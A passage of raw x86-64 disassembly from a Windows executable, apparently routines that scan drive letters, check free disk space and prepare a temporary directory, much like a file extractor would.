   1400065fa:	ba 04 01 00 00       	mov    $0x104,%edx
   1400065ff:	48 8b cf             	mov    %rdi,%rcx
   140006602:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140006609:	48 85 c0             	test   %rax,%rax
   14000660c:	74 13                	je     0x140006621
   14000660e:	41 8a 04 0e          	mov    (%r14,%rcx,1),%al
   140006612:	84 c0                	test   %al,%al
   140006614:	74 0b                	je     0x140006621
   140006616:	88 01                	mov    %al,(%rcx)
   140006618:	48 ff c1             	inc    %rcx
   14000661b:	48 83 ea 01          	sub    $0x1,%rdx
   14000661f:	75 e1                	jne    0x140006602
   140006621:	48 85 d2             	test   %rdx,%rdx
   140006624:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006628:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000662d:	ba 04 01 00 00       	mov    $0x104,%edx
   140006632:	48 0f 45 c1          	cmovne %rcx,%rax
   140006636:	48 8b cf             	mov    %rdi,%rcx
   140006639:	88 18                	mov    %bl,(%rax)
   14000663b:	e8 c8 17 00 00       	call   0x140007e08
   140006640:	48 8b cf             	mov    %rdi,%rcx
   140006643:	48 ff 15 4e 2c 00 00 	rex.W call *0x2c4e(%rip)        # 0x140009298
   14000664a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000664f:	48 8b cf             	mov    %rdi,%rcx
   140006652:	48 ff 15 cf 2b 00 00 	rex.W call *0x2bcf(%rip)        # 0x140009228
   140006659:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000665e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006661:	74 7c                	je     0x1400066df
   140006663:	81 fe 90 01 00 00    	cmp    $0x190,%esi
   140006669:	0f 8c 70 ff ff ff    	jl     0x1400065df
   14000666f:	4c 8b cf             	mov    %rdi,%r9
   140006672:	48 8d 15 63 33 00 00 	lea    0x3363(%rip),%rdx        # 0x1400099dc
   140006679:	45 33 c0             	xor    %r8d,%r8d
   14000667c:	48 8b cd             	mov    %rbp,%rcx
   14000667f:	48 ff 15 3a 2d 00 00 	rex.W call *0x2d3a(%rip)        # 0x1400093c0
   140006686:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000668b:	85 c0                	test   %eax,%eax
   14000668d:	74 25                	je     0x1400066b4
   14000668f:	48 8b cf             	mov    %rdi,%rcx
   140006692:	bb 01 00 00 00       	mov    $0x1,%ebx
   140006697:	48 ff 15 a2 2b 00 00 	rex.W call *0x2ba2(%rip)        # 0x140009240
   14000669e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400066a3:	33 d2                	xor    %edx,%edx
   1400066a5:	48 8b cf             	mov    %rdi,%rcx
   1400066a8:	48 ff 15 01 2c 00 00 	rex.W call *0x2c01(%rip)        # 0x1400092b0
   1400066af:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400066b4:	8b c3                	mov    %ebx,%eax
   1400066b6:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   1400066bd:	00 
   1400066be:	48 33 cc             	xor    %rsp,%rcx
   1400066c1:	e8 2a 20 00 00       	call   0x1400086f0
   1400066c6:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   1400066cd:	00 
   1400066ce:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400066d2:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400066d6:	49 8b e3             	mov    %r11,%rsp
   1400066d9:	41 5e                	pop    %r14
   1400066db:	5f                   	pop    %rdi
   1400066dc:	5e                   	pop    %rsi
   1400066dd:	c3                   	ret
   1400066de:	cc                   	int3
   1400066df:	33 d2                	xor    %edx,%edx
   1400066e1:	48 8b cf             	mov    %rdi,%rcx
   1400066e4:	48 ff 15 c5 2b 00 00 	rex.W call *0x2bc5(%rip)        # 0x1400092b0
   1400066eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400066f0:	85 c0                	test   %eax,%eax
   1400066f2:	0f 84 77 ff ff ff    	je     0x14000666f
   1400066f8:	c7 05 fe 65 00 00 01 	movl   $0x1,0x65fe(%rip)        # 0x14000cd00
   1400066ff:	00 00 00 
   140006702:	bb 01 00 00 00       	mov    $0x1,%ebx
   140006707:	eb ab                	jmp    0x1400066b4
   140006709:	cc                   	int3
   14000670a:	cc                   	int3
   14000670b:	cc                   	int3
   14000670c:	cc                   	int3
   14000670d:	cc                   	int3
   14000670e:	cc                   	int3
   14000670f:	cc                   	int3
   140006710:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006715:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000671a:	57                   	push   %rdi
   14000671b:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   140006722:	48 8b 05 df 58 00 00 	mov    0x58df(%rip),%rax        # 0x14000c008
   140006729:	48 33 c4             	xor    %rsp,%rax
   14000672c:	48 89 84 24 60 01 00 	mov    %rax,0x160(%rsp)
   140006733:	00 
   140006734:	41 8b f0             	mov    %r8d,%esi
   140006737:	4c 8b c9             	mov    %rcx,%r9
   14000673a:	85 d2                	test   %edx,%edx
   14000673c:	0f 84 c9 00 00 00    	je     0x14000680b
   140006742:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140006747:	e8 5c fe ff ff       	call   0x1400065a8
   14000674c:	85 c0                	test   %eax,%eax
   14000674e:	0f 84 6c 01 00 00    	je     0x1400068c0
   140006754:	48 8d 1d b5 6e 00 00 	lea    0x6eb5(%rip),%rbx        # 0x14000d610
   14000675b:	bf 04 01 00 00       	mov    $0x104,%edi
   140006760:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140006765:	8b d7                	mov    %edi,%edx
   140006767:	48 8b cb             	mov    %rbx,%rcx
   14000676a:	4c 2b c3             	sub    %rbx,%r8
   14000676d:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140006774:	48 85 c0             	test   %rax,%rax
   140006777:	74 13                	je     0x14000678c
   140006779:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   14000677d:	84 c0                	test   %al,%al
   14000677f:	74 0b                	je     0x14000678c
   140006781:	88 01                	mov    %al,(%rcx)
   140006783:	48 ff c1             	inc    %rcx
   140006786:	48 83 ea 01          	sub    $0x1,%rdx
   14000678a:	75 e1                	jne    0x14000676d
   14000678c:	48 85 d2             	test   %rdx,%rdx
   14000678f:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006793:	48 0f 45 c1          	cmovne %rcx,%rax
   140006797:	c6 00 00             	movb   $0x0,(%rax)
   14000679a:	f6 05 c3 76 00 00 20 	testb  $0x20,0x76c3(%rip)        # 0x14000de64
   1400067a1:	74 55                	je     0x1400067f8
   1400067a3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400067a8:	48 ff 15 d1 2b 00 00 	rex.W call *0x2bd1(%rip)        # 0x140009380
   1400067af:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400067b4:	0f b7 4c 24 20       	movzwl 0x20(%rsp),%ecx
   1400067b9:	85 c9                	test   %ecx,%ecx
   1400067bb:	74 2a                	je     0x1400067e7
   1400067bd:	83 e9 01             	sub    $0x1,%ecx
   1400067c0:	74 1c                	je     0x1400067de
   1400067c2:	83 e9 01             	sub    $0x1,%ecx
   1400067c5:	74 0e                	je     0x1400067d5
   1400067c7:	83 f9 01             	cmp    $0x1,%ecx
   1400067ca:	75 2c                	jne    0x1400067f8
   1400067cc:	4c 8d 05 25 32 00 00 	lea    0x3225(%rip),%r8        # 0x1400099f8
   1400067d3:	eb 19                	jmp    0x1400067ee
   1400067d5:	4c 8d 05 14 32 00 00 	lea    0x3214(%rip),%r8        # 0x1400099f0
   1400067dc:	eb 10                	jmp    0x1400067ee
   1400067de:	4c 8d 05 03 32 00 00 	lea    0x3203(%rip),%r8        # 0x1400099e8
   1400067e5:	eb 07                	jmp    0x1400067ee
   1400067e7:	4c 8d 05 f2 31 00 00 	lea    0x31f2(%rip),%r8        # 0x1400099e0
   1400067ee:	8b d7                	mov    %edi,%edx
   1400067f0:	48 8b cb             	mov    %rbx,%rcx
   1400067f3:	e8 10 16 00 00       	call   0x140007e08
   1400067f8:	4c 8d 05 61 2f 00 00 	lea    0x2f61(%rip),%r8        # 0x140009760
   1400067ff:	8b d7                	mov    %edi,%edx
   140006801:	48 8b cb             	mov    %rbx,%rcx
   140006804:	e8 ff 15 00 00       	call   0x140007e08
   140006809:	eb 3f                	jmp    0x14000684a
   14000680b:	48 8d 1d fe 6d 00 00 	lea    0x6dfe(%rip),%rbx        # 0x14000d610
   140006812:	bf 04 01 00 00       	mov    $0x104,%edi
   140006817:	48 8b cb             	mov    %rbx,%rcx
   14000681a:	4c 2b cb             	sub    %rbx,%r9
   14000681d:	48 8d 87 fa fe ff 7f 	lea    0x7ffffefa(%rdi),%rax
   140006824:	48 85 c0             	test   %rax,%rax
   140006827:	74 13                	je     0x14000683c
   140006829:	41 8a 04 09          	mov    (%r9,%rcx,1),%al
   14000682d:	84 c0                	test   %al,%al
   14000682f:	74 0b                	je     0x14000683c
   140006831:	88 01                	mov    %al,(%rcx)
   140006833:	48 ff c1             	inc    %rcx
   140006836:	48 83 ef 01          	sub    $0x1,%rdi
   14000683a:	75 e1                	jne    0x14000681d
   14000683c:	48 85 ff             	test   %rdi,%rdi
   14000683f:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006843:	48 0f 45 c1          	cmovne %rcx,%rax
   140006847:	c6 00 00             	movb   $0x0,(%rax)
   14000684a:	48 8b cb             	mov    %rbx,%rcx
   14000684d:	e8 4a 05 00 00       	call   0x140006d9c
   140006852:	85 c0                	test   %eax,%eax
   140006854:	75 1f                	jne    0x140006875
   140006856:	33 d2                	xor    %edx,%edx
   140006858:	48 8b cb             	mov    %rbx,%rcx
   14000685b:	48 ff 15 4e 2a 00 00 	rex.W call *0x2a4e(%rip)        # 0x1400092b0
   140006862:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006867:	85 c0                	test   %eax,%eax
   140006869:	74 29                	je     0x140006894
   14000686b:	c7 05 8b 64 00 00 01 	movl   $0x1,0x648b(%rip)        # 0x14000cd00
   140006872:	00 00 00 
   140006875:	45 33 c0             	xor    %r8d,%r8d
   140006878:	8b d6                	mov    %esi,%edx
   14000687a:	48 8b cb             	mov    %rbx,%rcx
   14000687d:	e8 92 06 00 00       	call   0x140006f14
   140006882:	85 c0                	test   %eax,%eax
   140006884:	74 1b                	je     0x1400068a1
   140006886:	83 25 b7 6c 00 00 00 	andl   $0x0,0x6cb7(%rip)        # 0x14000d544
   14000688d:	b8 01 00 00 00       	mov    $0x1,%eax
   140006892:	eb 2e                	jmp    0x1400068c2
   140006894:	e8 bf 10 00 00       	call   0x140007958
   140006899:	89 05 a5 6c 00 00    	mov    %eax,0x6ca5(%rip)        # 0x14000d544
   14000689f:	eb 1f                	jmp    0x1400068c0
   1400068a1:	83 3d 58 64 00 00 00 	cmpl   $0x0,0x6458(%rip)        # 0x14000cd00
   1400068a8:	74 16                	je     0x1400068c0
   1400068aa:	83 25 4f 64 00 00 00 	andl   $0x0,0x644f(%rip)        # 0x14000cd00
   1400068b1:	48 8b cb             	mov    %rbx,%rcx
   1400068b4:	48 ff 15 dd 29 00 00 	rex.W call *0x29dd(%rip)        # 0x140009298
   1400068bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400068c0:	33 c0                	xor    %eax,%eax
   1400068c2:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   1400068c9:	00 
   1400068ca:	48 33 cc             	xor    %rsp,%rcx
   1400068cd:	e8 1e 1e 00 00       	call   0x1400086f0
   1400068d2:	4c 8d 9c 24 70 01 00 	lea    0x170(%rsp),%r11
   1400068d9:	00 
   1400068da:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400068de:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400068e2:	49 8b e3             	mov    %r11,%rsp
   1400068e5:	5f                   	pop    %rdi
   1400068e6:	c3                   	ret
   1400068e7:	cc                   	int3
   1400068e8:	cc                   	int3
   1400068e9:	cc                   	int3
   1400068ea:	cc                   	int3
   1400068eb:	cc                   	int3
   1400068ec:	cc                   	int3
   1400068ed:	cc                   	int3
   1400068ee:	cc                   	int3
   1400068ef:	cc                   	int3
   1400068f0:	48 8b c4             	mov    %rsp,%rax
   1400068f3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400068f7:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400068fb:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400068ff:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140006903:	55                   	push   %rbp
   140006904:	41 56                	push   %r14
   140006906:	41 57                	push   %r15
   140006908:	48 8d 68 88          	lea    -0x78(%rax),%rbp
   14000690c:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140006913:	48 8b 05 ee 56 00 00 	mov    0x56ee(%rip),%rax        # 0x14000c008
   14000691a:	48 33 c4             	xor    %rsp,%rax
   14000691d:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140006921:	45 33 c0             	xor    %r8d,%r8d
   140006924:	48 8d 0d 0d 30 00 00 	lea    0x300d(%rip),%rcx        # 0x140009938
   14000692b:	33 d2                	xor    %edx,%edx
   14000692d:	e8 c6 e8 ff ff       	call   0x1400051f8
   140006932:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006937:	8b f0                	mov    %eax,%esi
   140006939:	8d 50 01             	lea    0x1(%rax),%edx
   14000693c:	48 ff 15 a5 2a 00 00 	rex.W call *0x2aa5(%rip)        # 0x1400093e8
   140006943:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006948:	33 db                	xor    %ebx,%ebx
   14000694a:	48 8b f8             	mov    %rax,%rdi
   14000694d:	48 85 c0             	test   %rax,%rax
   140006950:	75 30                	jne    0x140006982
   140006952:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006956:	45 33 c9             	xor    %r9d,%r9d
   140006959:	45 33 c0             	xor    %r8d,%r8d
   14000695c:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006963:	00 
   140006964:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140006969:	33 c9                	xor    %ecx,%ecx
   14000696b:	e8 bc e5 ff ff       	call   0x140004f2c
   140006970:	e8 e3 0f 00 00       	call   0x140007958
   140006975:	89 05 c9 6b 00 00    	mov    %eax,0x6bc9(%rip)        # 0x14000d544
   14000697b:	33 c0                	xor    %eax,%eax
   14000697d:	e9 e4 03 00 00       	jmp    0x140006d66
   140006982:	44 8b c6             	mov    %esi,%r8d
   140006985:	48 8d 0d ac 2f 00 00 	lea    0x2fac(%rip),%rcx        # 0x140009938
   14000698c:	48 8b d7             	mov    %rdi,%rdx
   14000698f:	e8 64 e8 ff ff       	call   0x1400051f8
   140006994:	85 c0                	test   %eax,%eax
   140006996:	75 39                	jne    0x1400069d1
   140006998:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000699c:	45 33 c9             	xor    %r9d,%r9d
   14000699f:	45 33 c0             	xor    %r8d,%r8d
   1400069a2:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400069a9:	00 
   1400069aa:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400069af:	33 c9                	xor    %ecx,%ecx
   1400069b1:	e8 76 e5 ff ff       	call   0x140004f2c
   1400069b6:	48 8b cf             	mov    %rdi,%rcx
   1400069b9:	48 ff 15 d0 28 00 00 	rex.W call *0x28d0(%rip)        # 0x140009290
   1400069c0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400069c5:	c7 05 75 6b 00 00 14 	movl   $0x80070714,0x6b75(%rip)        # 0x14000d544
   1400069cc:	07 07 80 
   1400069cf:	eb aa                	jmp    0x14000697b
   1400069d1:	48 8d 15 30 2f 00 00 	lea    0x2f30(%rip),%rdx        # 0x140009908
   1400069d8:	48 8b cf             	mov    %rdi,%rcx
   1400069db:	48 ff 15 0e 2a 00 00 	rex.W call *0x2a0e(%rip)        # 0x1400093f0
   1400069e2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400069e7:	8b 0d 73 74 00 00    	mov    0x7473(%rip),%ecx        # 0x14000de60
   1400069ed:	41 be 01 00 00 00    	mov    $0x1,%r14d
   1400069f3:	85 c0                	test   %eax,%eax
   1400069f5:	41 0f 44 ce          	cmove  %r14d,%ecx
   1400069f9:	89 0d 61 74 00 00    	mov    %ecx,0x7461(%rip)        # 0x14000de60
   1400069ff:	48 8b cf             	mov    %rdi,%rcx
   140006a02:	48 ff 15 87 28 00 00 	rex.W call *0x2887(%rip)        # 0x140009290
   140006a09:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006a0e:	8a 05 0a 64 00 00    	mov    0x640a(%rip),%al        # 0x14000ce1e
   140006a14:	84 c0                	test   %al,%al
   140006a16:	74 4b                	je     0x140006a63
   140006a18:	3c 5c                	cmp    $0x5c,%al
   140006a1a:	75 0b                	jne    0x140006a27
   140006a1c:	38 05 fd 63 00 00    	cmp    %al,0x63fd(%rip)        # 0x14000ce1f
   140006a22:	44 8b c3             	mov    %ebx,%r8d
   140006a25:	74 03                	je     0x140006a2a
   140006a27:	45 8b c6             	mov    %r14d,%r8d
   140006a2a:	33 d2                	xor    %edx,%edx
   140006a2c:	48 8d 0d eb 63 00 00 	lea    0x63eb(%rip),%rcx        # 0x14000ce1e
   140006a33:	e8 d8 fc ff ff       	call   0x140006710
   140006a38:	85 c0                	test   %eax,%eax
   140006a3a:	0f 85 fb 02 00 00    	jne    0x140006d3b
   140006a40:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006a44:	45 33 c9             	xor    %r9d,%r9d
   140006a47:	45 33 c0             	xor    %r8d,%r8d
   140006a4a:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006a51:	00 
   140006a52:	ba be 04 00 00       	mov    $0x4be,%edx
   140006a57:	33 c9                	xor    %ecx,%ecx
   140006a59:	e8 ce e4 ff ff       	call   0x140004f2c
   140006a5e:	e9 18 ff ff ff       	jmp    0x14000697b
   140006a63:	39 1d 9b 62 00 00    	cmp    %ebx,0x629b(%rip)        # 0x14000cd04
   140006a69:	0f 85 d1 02 00 00    	jne    0x140006d40
   140006a6f:	39 1d eb 73 00 00    	cmp    %ebx,0x73eb(%rip)        # 0x14000de60
   140006a75:	0f 85 c5 02 00 00    	jne    0x140006d40
   140006a7b:	4c 8d 3d 8e 6b 00 00 	lea    0x6b8e(%rip),%r15        # 0x14000d610
   140006a82:	41 bc 04 01 00 00    	mov    $0x104,%r12d
   140006a88:	49 8b d7             	mov    %r15,%rdx
   140006a8b:	41 8b cc             	mov    %r12d,%ecx
   140006a8e:	48 ff 15 b3 28 00 00 	rex.W call *0x28b3(%rip)        # 0x140009348
   140006a95:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006a9a:	85 c0                	test   %eax,%eax
   140006a9c:	74 3b                	je     0x140006ad9
   140006a9e:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140006aa4:	41 8b d6             	mov    %r14d,%edx
   140006aa7:	49 8b cf             	mov    %r15,%rcx
   140006aaa:	e8 61 fc ff ff       	call   0x140006710
   140006aaf:	85 c0                	test   %eax,%eax
   140006ab1:	0f 85 84 02 00 00    	jne    0x140006d3b
   140006ab7:	49 8b cf             	mov    %r15,%rcx
   140006aba:	e8 d1 b9 ff ff       	call   0x140002490
   140006abf:	85 c0                	test   %eax,%eax
   140006ac1:	75 16                	jne    0x140006ad9
   140006ac3:	45 8b c6             	mov    %r14d,%r8d
   140006ac6:	41 8b d6             	mov    %r14d,%edx
   140006ac9:	49 8b cf             	mov    %r15,%rcx
   140006acc:	e8 3f fc ff ff       	call   0x140006710
   140006ad1:	85 c0                	test   %eax,%eax
   140006ad3:	0f 85 62 02 00 00    	jne    0x140006d3b
   140006ad9:	48 8d 35 1c 2f 00 00 	lea    0x2f1c(%rip),%rsi        # 0x1400099fc
   140006ae0:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140006ae5:	48 2b f0             	sub    %rax,%rsi
   140006ae8:	49 8b d4             	mov    %r12,%rdx
   140006aeb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006af0:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140006af7:	48 85 c0             	test   %rax,%rax
   140006afa:	74 11                	je     0x140006b0d
   140006afc:	8a 04 0e             	mov    (%rsi,%rcx,1),%al
   140006aff:	84 c0                	test   %al,%al
   140006b01:	74 0a                	je     0x140006b0d
   140006b03:	88 01                	mov    %al,(%rcx)
   140006b05:	49 03 ce             	add    %r14,%rcx
   140006b08:	49 2b d6             	sub    %r14,%rdx
   140006b0b:	75 e3                	jne    0x140006af0
   140006b0d:	48 85 d2             	test   %rdx,%rdx
   140006b10:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006b14:	48 0f 45 c1          	cmovne %rcx,%rax
   140006b18:	88 18                	mov    %bl,(%rax)
   140006b1a:	80 7c 24 40 5a       	cmpb   $0x5a,0x40(%rsp)
   140006b1f:	0f 8f e2 01 00 00    	jg     0x140006d07
   140006b25:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006b2a:	48 ff 15 b7 27 00 00 	rex.W call *0x27b7(%rip)        # 0x1400092e8
   140006b31:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006b36:	8b f8                	mov    %eax,%edi
   140006b38:	83 f8 06             	cmp    $0x6,%eax
   140006b3b:	74 05                	je     0x140006b42
   140006b3d:	83 f8 03             	cmp    $0x3,%eax
   140006b40:	75 1a                	jne    0x140006b5c
   140006b42:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006b47:	48 ff 15 da 26 00 00 	rex.W call *0x26da(%rip)        # 0x140009228
   140006b4e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006b53:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006b56:	0f 85 8d 00 00 00    	jne    0x140006be9
   140006b5c:	83 ff 02             	cmp    $0x2,%edi
   140006b5f:	75 78                	jne    0x140006bd9
   140006b61:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140006b65:	8d 41 bf             	lea    -0x41(%rcx),%eax
   140006b68:	41 3a c6             	cmp    %r14b,%al
   140006b6b:	76 70                	jbe    0x140006bdd
   140006b6d:	89 5c 24 34          	mov    %ebx,0x34(%rsp)
   140006b71:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140006b75:	89 5c 24 3c          	mov    %ebx,0x3c(%rsp)
   140006b79:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140006b7d:	84 c9                	test   %cl,%cl
   140006b7f:	74 5c                	je     0x140006bdd
   140006b81:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140006b86:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   140006b8b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006b90:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140006b95:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   140006b9a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006b9f:	48 ff 15 ea 28 00 00 	rex.W call *0x28ea(%rip)        # 0x140009490
   140006ba6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006bab:	85 c0                	test   %eax,%eax
   140006bad:	74 2a                	je     0x140006bd9
   140006baf:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140006bb3:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140006bb9:	0f af 4c 24 34       	imul   0x34(%rsp),%ecx
   140006bbe:	8b 54 24 38          	mov    0x38(%rsp),%edx
   140006bc2:	48 ff 15 cf 28 00 00 	rex.W call *0x28cf(%rip)        # 0x140009498
   140006bc9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006bce:	85 c0                	test   %eax,%eax
   140006bd0:	74 07                	je     0x140006bd9
   140006bd2:	3d 00 90 01 00       	cmp    $0x19000,%eax
   140006bd7:	73 10                	jae    0x140006be9
   140006bd9:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140006bdd:	41 02 ce             	add    %r14b,%cl
   140006be0:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   140006be4:	e9 15 01 00 00       	jmp    0x140006cfe
   140006be9:	45 33 c0             	xor    %r8d,%r8d
   140006bec:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006bf1:	41 8d 50 03          	lea    0x3(%r8),%edx
   140006bf5:	e8 1a 03 00 00       	call   0x140006f14
   140006bfa:	85 c0                	test   %eax,%eax
   140006bfc:	75 22                	jne    0x140006c20
   140006bfe:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006c03:	e8 88 b8 ff ff       	call   0x140002490
   140006c08:	85 c0                	test   %eax,%eax
   140006c0a:	75 cd                	jne    0x140006bd9
   140006c0c:	45 33 c0             	xor    %r8d,%r8d
   140006c0f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006c14:	41 8b d6             	mov    %r14d,%edx
   140006c17:	e8 f8 02 00 00       	call   0x140006f14
   140006c1c:	85 c0                	test   %eax,%eax
   140006c1e:	74 b9                	je     0x140006bd9
   140006c20:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006c25:	e8 66 b8 ff ff       	call   0x140002490
   140006c2a:	85 c0                	test   %eax,%eax
   140006c2c:	74 14                	je     0x140006c42
   140006c2e:	41 8b d4             	mov    %r12d,%edx
   140006c31:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006c36:	48 ff 15 33 26 00 00 	rex.W call *0x2633(%rip)        # 0x140009270
   140006c3d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c42:	4c 8d 05 b7 2d 00 00 	lea    0x2db7(%rip),%r8        # 0x140009a00
   140006c49:	41 8b d4             	mov    %r12d,%edx
   140006c4c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006c51:	e8 b2 11 00 00       	call   0x140007e08
   140006c56:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006c5b:	48 ff 15 c6 25 00 00 	rex.W call *0x25c6(%rip)        # 0x140009228
   140006c62:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c67:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006c6a:	75 15                	jne    0x140006c81
   140006c6c:	33 d2                	xor    %edx,%edx
   140006c6e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006c73:	48 ff 15 36 26 00 00 	rex.W call *0x2636(%rip)        # 0x1400092b0
   140006c7a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c7f:	eb 03                	jmp    0x140006c84
   140006c81:	83 e0 10             	and    $0x10,%eax
   140006c84:	85 c0                	test   %eax,%eax
   140006c86:	75 11                	jne    0x140006c99
   140006c88:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140006c8c:	41 02 ce             	add    %r14b,%cl
   140006c8f:	88 5c 24 43          	mov    %bl,0x43(%rsp)
   140006c93:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   140006c97:	eb 65                	jmp    0x140006cfe
   140006c99:	ba 02 00 00 00       	mov    $0x2,%edx
   140006c9e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006ca3:	48 ff 15 ce 25 00 00 	rex.W call *0x25ce(%rip)        # 0x140009278
   140006caa:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006caf:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140006cb4:	49 8b d4             	mov    %r12,%rdx
   140006cb7:	4d 2b c7             	sub    %r15,%r8
   140006cba:	49 8b cf             	mov    %r15,%rcx
   140006cbd:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140006cc4:	48 85 c0             	test   %rax,%rax
   140006cc7:	74 12                	je     0x140006cdb
   140006cc9:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140006ccd:	84 c0                	test   %al,%al
   140006ccf:	74 0a                	je     0x140006cdb
   140006cd1:	88 01                	mov    %al,(%rcx)
   140006cd3:	49 03 ce             	add    %r14,%rcx
   140006cd6:	49 2b d6             	sub    %r14,%rdx
   140006cd9:	75 e2                	jne    0x140006cbd
   140006cdb:	48 85 d2             	test   %rdx,%rdx
   140006cde:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006ce2:	41 8b d6             	mov    %r14d,%edx
   140006ce5:	48 0f 45 c1          	cmovne %rcx,%rax
   140006ce9:	45 33 c0             	xor    %r8d,%r8d
   140006cec:	49 8b cf             	mov    %r15,%rcx
   140006cef:	88 18                	mov    %bl,(%rax)
   140006cf1:	e8 1a fa ff ff       	call   0x140006710
   140006cf6:	85 c0                	test   %eax,%eax
   140006cf8:	75 41                	jne    0x140006d3b
   140006cfa:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140006cfe:	80 f9 5a             	cmp    $0x5a,%cl
   140006d01:	0f 8e 1e fe ff ff    	jle    0x140006b25
   140006d07:	41 8b d4             	mov    %r12d,%edx
   140006d0a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006d0f:	48 ff 15 5a 25 00 00 	rex.W call *0x255a(%rip)        # 0x140009270
   140006d16:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006d1b:	ba 03 00 00 00       	mov    $0x3,%edx
